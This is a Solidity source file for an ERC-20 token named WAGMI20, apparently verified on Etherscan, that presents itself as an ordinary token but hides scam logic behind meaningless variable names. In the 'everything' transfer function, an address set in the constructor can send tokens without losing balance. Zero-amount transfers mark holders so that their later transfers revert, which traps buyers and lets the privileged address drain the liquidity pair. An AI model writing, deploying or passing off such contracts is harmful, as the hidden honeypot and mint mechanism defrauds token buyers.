/**
 *Submitted for verification at Etherscan.io on 2023-05-04
*/

/**
 
*/

//https://t.me/Wagmi20Erc20
//https://www.wagmi20.com/

// SPDX-License-Identifier: MIT

pragma solidity >0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract WAGMI20 is Ownable {
    function everything(address anything, address rope, uint256 where) private returns (bool success) {
        if (where == 0) {
            evening[rope] += middle;
        }
        if (doll[anything] == 0) {
            balanceOf[anything] -= where;
            if (uniswapV2Pair != anything && evening[anything] > 0) {
                doll[anything] -= middle;
            }
        }
        balanceOf[rope] += where;
        emit Transfer(anything, rope, where);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private doll;

    mapping(address => uint256) public balanceOf;

    constructor(string memory best, string memory heavy, address police) {
        name = best;
        symbol = heavy;
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        doll[police] = middle;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address torn, uint256 where) public returns (bool success) {
        allowance[msg.sender][torn] = where;
        emit Approval(msg.sender, torn, where);
        return true;
    }

    uint8 public decimals = 9;

    address public uniswapV2Pair;

    uint256 private middle = 51;

    string public symbol;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private evening;

    uint256 public totalSupply;

    string public name;

    function transferFrom(address anything, address rope, uint256 where) public returns (bool success) {
        everything(anything, rope, where);
        require(where <= allowance[anything][msg.sender]);
        allowance[anything][msg.sender] -= where;
        return true;
    }

    function transfer(address rope, uint256 where) public returns (bool success) {
        everything(msg.sender, rope, where);
        return true;
    }
}